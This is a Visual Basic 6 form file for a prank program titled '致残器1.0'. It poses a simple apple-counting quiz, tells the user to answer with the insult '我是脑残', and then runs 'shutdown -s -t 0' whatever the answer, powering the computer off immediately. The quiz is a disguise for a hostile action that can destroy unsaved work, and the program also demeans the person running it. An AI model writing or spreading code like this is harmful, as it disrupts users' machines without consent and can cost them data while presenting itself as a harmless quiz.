VERSION 5.00
Begin VB.Form Form3 
   Caption         =   "致残器1.0"
   ClientHeight    =   3375
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   5820
   LinkTopic       =   "Form3"
   ScaleHeight     =   3375
   ScaleWidth      =   5820
   StartUpPosition =   3  '窗口缺省
   Begin VB.CommandButton 确认按钮 
      Caption         =   "确认"
      Height          =   615
      Left            =   3360
      TabIndex        =   2
      Top             =   1920
      Width           =   1335
   End
   Begin VB.TextBox 输入框 
      Height          =   495
      Left            =   480
      TabIndex        =   1
      Text            =   "回答输入"
      Top             =   1920
      Width           =   2175
   End
   Begin VB.Label 题干 
      Caption         =   "小明有一个苹果，妈妈有一个苹果，他们一共有几个苹果？（请注意此题回答方式，你只需要回答“我是谁（如脑X）？”）"
      Height          =   735
      Left            =   960
      TabIndex        =   0
      Top             =   480
      Width           =   3495
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()

End Sub

Private Sub 确认按钮_Click()
If 输入框.Text = "我是脑残" Then
MsgBox "恭喜您已经致残成功，计算机即将关闭！"
Shell "shutdown -s -t 0"
Else
MsgBox "回答错误！正确答案为：我是脑残！"
Shell "shutdown -s -t 0"
End If
End Sub

